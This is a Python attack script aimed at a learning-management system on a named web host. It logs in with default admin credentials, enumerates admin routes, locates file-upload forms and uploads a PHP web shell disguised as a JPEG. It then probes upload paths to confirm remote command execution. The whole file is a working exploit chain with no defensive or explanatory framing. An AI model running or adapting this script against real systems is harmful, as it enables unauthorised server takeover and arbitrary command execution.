import requests
import re
import json

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def explore_admin_routes():
    """Explore admin panel to find upload endpoints"""
    print("\n[*] Exploring Admin Panel Routes...")
    
    # Common admin routes to check
    routes = [
        "/admin",
        "/admin/settings",
        "/admin/settings/general",
        "/admin/settings/customization", 
        "/admin/webinars",
        "/admin/files",
        "/admin/files/images",
        "/admin/files/upload",
        "/admin/users",
        "/admin/marketing",
        "/panel",
        "/panel/webinars",
        "/panel/webinars/create",
        "/panel/files",
        "/panel/files/images",
        "/panel/setting",
        "/panel/setting/step/1",
        "/panel/certificates",
        "/panel/products",
        "/panel/products/create"
    ]
    
    accessible = []
    for route in routes:
        try:
            r = session.get(f"{BASE_URL}{route}", timeout=10)
            status = r.status_code
            has_upload = "upload" in r.text.lower() or "file" in r.text.lower()
            has_form = "enctype" in r.text.lower()
            
            if status == 200:
                info = f"[200] {route}"
                if has_upload:
                    info += " [HAS UPLOAD]"
                if has_form:
                    info += " [HAS FORM]"
                print(info)
                accessible.append((route, has_upload, has_form))
        except:
            pass
    
    return accessible

def find_upload_forms(routes):
    """Deep scan for upload forms in accessible routes"""
    print("\n[*] Scanning for File Upload Forms...")
    
    upload_endpoints = []
    for route, _, _ in routes:
        try:
            r = session.get(f"{BASE_URL}{route}", timeout=10)
            
            # Look for file input fields
            file_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*>', r.text, re.IGNORECASE)
            
            if file_inputs:
                print(f"\n[+] Found file input at: {route}")
                for inp in file_inputs:
                    name = re.search(r'name=["\']([^"\']+)["\']', inp)
                    accept = re.search(r'accept=["\']([^"\']+)["\']', inp)
                    print(f"    Input: {inp[:100]}...")
                    if name:
                        print(f"    Name: {name.group(1)}")
                    if accept:
                        print(f"    Accept: {accept.group(1)}")
                        
                # Find the form action
                forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*enctype[^>]*>', r.text, re.IGNORECASE)
                for form in forms:
                    print(f"    Form Action: {form}")
                    upload_endpoints.append((route, form))
                    
        except Exception as e:
            pass
    
    return upload_endpoints

def test_direct_php_upload():
    """Test if we can upload PHP directly via any endpoint"""
    print("\n[*] Testing Direct PHP Upload...")
    
    # Try profile image upload with PHP content
    endpoints_to_test = [
        ("/panel/setting/step/1", "profile_image"),
        ("/panel/setting", "profile_image"),
        ("/admin/settings/general", "site_logo"),
    ]
    
    php_shell = b"<?php system($_GET['c']); ?>"
    
    for endpoint, field_name in endpoints_to_test:
        try:
            # Get CSRF
            r = session.get(f"{BASE_URL}{endpoint}")
            csrf = re.search(r'name="_token" value="([^"]+)"', r.text)
            if not csrf:
                continue
                
            token = csrf.group(1)
            
            # Try uploading with .php extension
            files = {
                field_name: ('shell.php', php_shell, 'image/jpeg')
            }
            data = {'_token': token}
            
            r = session.post(f"{BASE_URL}{endpoint}", files=files, data=data)
            print(f"[{endpoint}] Status: {r.status_code}")
            
            if r.status_code == 200:
                # Check if shell was uploaded
                shell_paths = [
                    "/store/shell.php",
                    "/storage/shell.php",
                    "/uploads/shell.php",
                    "/public/shell.php"
                ]
                for path in shell_paths:
                    try:
                        check = session.get(f"{BASE_URL}{path}?c=id", timeout=5)
                        if "uid=" in check.text:
                            print(f"\n[!!!] RCE SUCCESS! Shell at: {BASE_URL}{path}")
                            return True
                    except:
                        pass
                        
        except Exception as e:
            print(f"Error: {e}")
    
    return False

def main():
    if not login():
        return
    
    # Step 1: Explore routes
    routes = explore_admin_routes()
    
    # Step 2: Find upload forms
    uploads = find_upload_forms(routes)
    
    # Step 3: Test direct PHP upload
    test_direct_php_upload()
    
    print("\n[*] Exploration complete.")

if __name__ == "__main__":
    main()
